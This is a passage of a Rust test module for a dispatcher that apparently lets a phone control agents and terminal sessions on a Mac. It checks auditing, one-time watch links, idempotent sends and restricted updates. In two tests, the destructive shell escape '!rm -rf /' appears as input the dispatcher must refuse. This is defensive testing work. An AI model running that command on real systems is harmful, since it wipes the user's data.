                "discard copy-1".to_string()
            ]
        );
        let audit = stub.audited();
        assert!(audit.iter().any(|a| a.1 == "agents.keepCopy"));
        assert!(audit.iter().any(|a| a.1 == "agents.discardCopy"));
    }

    #[tokio::test]
    async fn watch_live_hands_a_one_time_tailnet_link_and_is_audited() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        assert!(METHODS.contains(&"agents.watchLive"));
        assert!(!READ_ONLY_METHODS.contains(&"agents.watchLive"));
        let link = dispatch(
            &c,
            &me,
            "agents.watchLive",
            json!({ "agentId": AGENT, "messageId": "m-result" }),
        )
        .await
        .unwrap();
        let url = link["url"].as_str().unwrap();
        let prefix = format!(
            "https://mac.example.ts.net:{}{}",
            super::super::watch::WATCH_TAILNET_PORT,
            super::super::watch::ticket_prefix()
        );
        assert!(url.starts_with(&prefix), "{url}");
        assert!(link["expiresAt"].as_u64().unwrap() > 0);
        // Nothing running for that card: an honest refusal, no link.
        let refused = dispatch(
            &c,
            &me,
            "agents.watchLive",
            json!({ "agentId": AGENT, "messageId": "m-not-running" }),
        )
        .await
        .unwrap_err();
        assert!(format!("{refused:?}").contains("Open Preview on the Mac first"));
        assert!(stub.audited().iter().any(|a| a.1 == "agents.watchLive"));
    }

    #[tokio::test]
    async fn a_session_starts_once_per_client_id_with_remote_access_refusals() {
        use crate::companion::testkit::Stub;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let project = "/Users/julian/ShipStudio/site";
        let start = |prompt: &str, client: &str| json!({ "project": project, "prompt": prompt, "clientId": client });
        let first = dispatch(&c, &me, "sessions.start", start("add a footer", "a1"))
            .await
            .unwrap();
        assert_eq!(first["sessionId"], "pty-new");
        dispatch(&c, &me, "sessions.start", start("add a footer", "a1"))
            .await
            .unwrap();
        assert_eq!(stub.typed.lock().unwrap().len(), 1);
        assert!(
            dispatch(&c, &me, "sessions.start", start("!rm -rf /", "a3"))
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn a_preview_screenshot_is_a_private_blob() {
        use crate::companion::testkit::Stub;
        let (c, _) = Stub::companion();
        let me = caller("dev_a");
        let blob = dispatch(
            &c,
            &me,
            "preview.screenshot",
            json!({ "project": "/Users/julian/ShipStudio/site", "device": "phone" }),
        )
        .await
        .unwrap();
        assert_eq!(blob["name"], "site-phone.jpg");
        assert_eq!(blob["mime"], "image/jpeg");
        let id = blob["blobId"].as_str().unwrap();
        assert!(c.blobs.get("dev_a", id, now_ms()).is_some());
        assert!(c.blobs.get("dev_b", id, now_ms()).is_none());
        assert!(dispatch(
            &c,
            &me,
            "preview.screenshot",
            json!({ "project": "/x", "device": "watch" }),
        )
        .await
        .is_err());
    }

    #[tokio::test]
    async fn the_phone_may_only_pin_mute_and_hide() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let done = dispatch(
            &c,
            &me,
            "agents.update",
            json!({ "agentId": AGENT, "input": { "muted": true, "pinned": false } }),
        )
        .await
        .unwrap();
        assert_eq!(done["muted"], true);
        assert_eq!(done["pinned"], false);
        for refused in [
            json!({ "agentId": AGENT, "input": { "name": "Evil" } }),
            json!({ "agentId": AGENT, "input": { "model": "opus" } }),
            json!({ "agentId": AGENT, "input": { "instructions": "x".repeat(MAX_INSTRUCTIONS + 1) } }),
            json!({ "agentId": AGENT, "input": {} }),
        ] {
            assert!(dispatch(&c, &me, "agents.update", refused).await.is_err());
        }
        // The instructions can be corrected from the agent sheet, and the audit says so.
        dispatch(
            &c,
            &me,
            "agents.update",
            json!({ "agentId": AGENT, "input": { "instructions": "Check the invoices" } }),
        )
        .await
        .unwrap();
        assert_eq!(stub.toggles.lock().unwrap().len(), 2);
        let audit = stub.audited();
        assert_eq!(audit[0].2, format!("unpin mute {AGENT}"));
        assert_eq!(
            audit.last().unwrap().2,
            format!("edit instructions (18 chars) {AGENT}")
        );
    }

    #[tokio::test]
    async fn the_phone_can_start_an_agent_fresh() {
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let done = dispatch(&c, &me, "agents.startFresh", json!({ "agentId": AGENT }))
            .await
            .unwrap();
        assert_eq!(done["sessionId"], Value::Null);
        assert!(done.get("context").is_none());
        assert_eq!(*stub.fresh.lock().unwrap(), vec![AGENT.to_string()]);
        assert!(stub.audited().iter().any(|a| a.1 == "agents.startFresh"));
        assert!(
            dispatch(&c, &me, "agents.startFresh", json!({ "agentId": "nobody" }))
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn session_input_gets_remote_access_refusals_and_is_sent_once() {
        use crate::companion::testkit::Stub;
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let project = "/Users/julian/ShipStudio/site";
        let send = |text: &str, client: &str, tab: &str| json!({ "project": project, "sessionId": tab, "text": text, "clientId": client });
        // The working tab takes a message, once per clientId.
        let first = dispatch(&c, &me, "sessions.send", send("fix it", "s1", "pty-1"))
            .await
            .unwrap();
        assert_eq!(first["sessionId"], "pty-1");
        dispatch(&c, &me, "sessions.send", send("fix it", "s1", "pty-1"))
            .await
            .unwrap();
        assert_eq!(stub.typed.lock().unwrap().len(), 1);
        // Shell escapes, control characters and unknown slash commands never reach a tab.
        for text in ["!rm -rf /", "\u{7}\u{8}", "/logout"] {
            let refused = dispatch(&c, &me, "sessions.send", send(text, text, "pty-1")).await;
            assert!(refused.is_err(), "{text}");
        }
        // A tab showing a question isn't typed into: Enter would answer it.
        let asking = dispatch(&c, &me, "sessions.send", send("hello", "s2", "pty-2")).await;
        assert!(asking
            .unwrap_err()
            .summary()
            .contains("waiting for your answer"));
        // Keys: only ones Remote Access can press, a digit only while asking.
        let key = |k: &str, tab: &str| json!({ "sessionId": tab, "key": k });
        dispatch(&c, &me, "sessions.key", key("1", "pty-2"))
            .await
            .unwrap();
        assert!(dispatch(&c, &me, "sessions.key", key("1", "pty-1"))
            .await
            .is_err());
        assert!(dispatch(&c, &me, "sessions.key", key("rm", "pty-2"))
            .await
            .is_err());
        assert_eq!(stub.typed.lock().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn setting_up_the_team_reaches_the_desk_and_only_reading_it_goes_unaudited() {
        use crate::agents::team_setup::{StepId, StepState};
        use crate::companion::testkit::{Stub, AGENT};
        let (c, stub) = Stub::companion();
        let me = caller("dev_a");
        let view = dispatch(&c, &me, "agents.teamSetup", Value::Null)
            .await
            .unwrap();
        assert_eq!(view["steps"][0]["id"], "logins");
        dispatch(&c, &me, "agents.teamSetup", json!({ "any": true }))
            .await
            .unwrap();
        dispatch(
            &c,
            &me,
            "agents.teamSetup.step",
            json!({ "step": "routines", "state": "skipped" }),
        )
        .await
        .unwrap();
        assert!(dispatch(
            &c,
            &me,
            "agents.teamSetup.step",
            json!({ "step": "everything", "state": "done" })
        )
        .await
        .is_err());
        dispatch(
            &c,
            &me,
            "agents.teamSetup.routine",
            json!({ "agentId": "a2", "checkInId": "c1", "on": true }),
        )
        .await
        .unwrap();
        let sent = dispatch(
            &c,
            &me,
            "agents.teamSetup.hello",
            json!({ "agentId": AGENT }),
        )
        .await
        .unwrap();
        assert!(sent.get("id").is_some());
        dispatch(&c, &me, "agents.teamSetup.missing", json!({}))
            .await
            .unwrap();
        dispatch(&c, &me, "agents.teamSetup.dismiss", json!({}))
            .await
            .unwrap();
        assert_eq!(
            *stub.team_setup.lock().unwrap(),
            vec![
                TeamSetupAction::Get { any: false },
                TeamSetupAction::Get { any: true },
                TeamSetupAction::Step {
                    step: StepId::Routines,
                    state: StepState::Skipped
                },
                TeamSetupAction::Routine {
                    agent_id: "a2".into(),
                    check_in_id: "c1".into(),
                    on: true
                },
                TeamSetupAction::Hello {
                    agent_id: AGENT.into()
                },
                TeamSetupAction::Missing,
                TeamSetupAction::Dismiss,
            ]
        );
        let audited: Vec<String> = stub
            .audited()
            .into_iter()
            .map(|(_, m, d, _)| format!("{m}: {d}"))
            .collect();
        assert!(!audited.iter().any(|l| l.starts_with("agents.teamSetup:")));
        assert!(audited
            .iter()
            .any(|l| l == "agents.teamSetup.routine: setup: switch on c1 a2"));
        assert!(audited
            .iter()
            .any(|l| l.starts_with("agents.teamSetup.hello: setup: said hi to")));
    }

    #[test]
    fn every_read_only_method_is_served() {
        for m in READ_ONLY_METHODS {
            assert!(METHODS.contains(m), "{m}");
        }
    }

    #[tokio::test]
    async fn a_send_cache_runs_each_client_id_once() {
        let cache = SendCache::default();
        let runs = std::sync::atomic::AtomicUsize::new(0);
        let send = || async {
            runs.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            Ok(json!({ "id": "m1" }))
        };
        let a = cache.once("dev:c1".into(), 0, send).await.unwrap();
        let b = cache.once("dev:c1".into(), 1, send).await.unwrap();
        assert_eq!(a, b);
        assert_eq!(runs.load(std::sync::atomic::Ordering::SeqCst), 1);
        cache.once("dev:c2".into(), 2, send).await.unwrap();
        assert_eq!(runs.load(std::sync::atomic::Ordering::SeqCst), 2);
        // A day later the id is forgotten.
        cache
            .once("dev:c1".into(), SEND_MEMORY_MS + 5, send)
            .await
            .unwrap();
        assert_eq!(runs.load(std::sync::atomic::Ordering::SeqCst), 3);
    }

    #[tokio::test]
    async fn a_failed_send_can_be_retried() {
        let cache = SendCache::default();
        let failed = cache
            .once("k".into(), 0, || async {
                Err(WireError::Command(CommandError::expected("disk full")))
            })
            .await;
        assert!(failed.is_err());
        let ok = cache.once("k".into(), 1, || async { Ok(json!(1)) }).await;
        assert_eq!(ok.unwrap(), json!(1));
    }
}
